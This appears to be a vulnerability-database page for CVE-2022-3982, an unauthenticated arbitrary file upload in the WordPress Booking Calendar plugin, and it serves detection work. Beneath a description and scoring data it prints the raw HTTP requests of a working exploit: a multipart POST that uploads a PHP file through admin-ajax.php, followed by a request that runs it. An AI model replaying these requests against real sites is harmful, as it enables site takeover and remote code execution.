---
layout: post
cve_id: CVE-2022-3982
title: WordPress Booking Calendar <3.2.2 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2022/CVE-2022-3982.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-3982.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: critical
impact: 'This vulnerability can lead to remote code execution, allowing attackers
  to take control of the affected WordPress website.

  '
remediation: Fixed in 3.2.2.
reference:
- https://wpscan.com/vulnerability/4d91f3e1-4de9-46c1-b5ba-cc55b7726867
- https://wordpress.org/plugins/booking-calendar/
- https://nvd.nist.gov/vuln/detail/CVE-2022-3982
- https://github.com/cyllective/CVEs
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-3982
  cwe-id: CWE-434
  epss-score: 0.82236
  epss-percentile: 0.99182
  cpe: cpe:2.3:a:wpdevart:booking_calendar:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 3
  vendor: wpdevart
  product: booking_calendar
  framework: wordpress
tags:
- cve
- cve2022
- rce
- wpscan
- wordpress
- wp-plugin
- wp
- booking-calendar
- unauthenticated
- intrusive
- wpdevart
- vkev
- vuln
---

## ðŸ” Vulnerability Description
WordPress Booking Calendar plugin before 3.2.2 is susceptible to arbitrary file upload possibly leading to remote code execution. The plugin does not validate uploaded files, which can allow an attacker to upload arbitrary files, such as PHP, and potentially obtain sensitive information, modify data, and/or execute unauthorized operations.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Content-Length: 829
Content-Type: multipart/form-data; boundary=------------------------1cada150a8151a54
Accept-Encoding: gzip

--------------------------1cada150a8151a54
Content-Disposition: form-data; name="action"

wpdevart_form_ajax
--------------------------1cada150a8151a54
Content-Disposition: form-data; name="wpdevart_id"

x
--------------------------1cada150a8151a54
Content-Disposition: form-data; name="wpdevart_nonce"

YdWaDg
--------------------------1cada150a8151a54
Content-Disposition: form-data; name="wpdevart_data"

{"wpdevart-submit":"X"}
--------------------------1cada150a8151a54
Content-Disposition: form-data; name="wpdevart-submit"

1
--------------------------1cada150a8151a54
Content-Disposition: form-data; name="file"; filename="38FC6OVocV8EaRr8zkFzbmRlJnf.php"
Content-Type: application/octet-stream

<?php echo md5("CVE-2022-3982");unlink(__FILE__);?>

--------------------------1cada150a8151a54--
```

```nohighlight
GET /wp-content/uploads/booking_calendar/38FC6OVocV8EaRr8zkFzbmRlJnf.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_10_3 rv:2.0; so-DJ) AppleWebKit/533.15.6 (KHTML, like Gecko) Version/4.0.2 Safari/533.15.6
Connection: close
Accept-Encoding: gzip
```

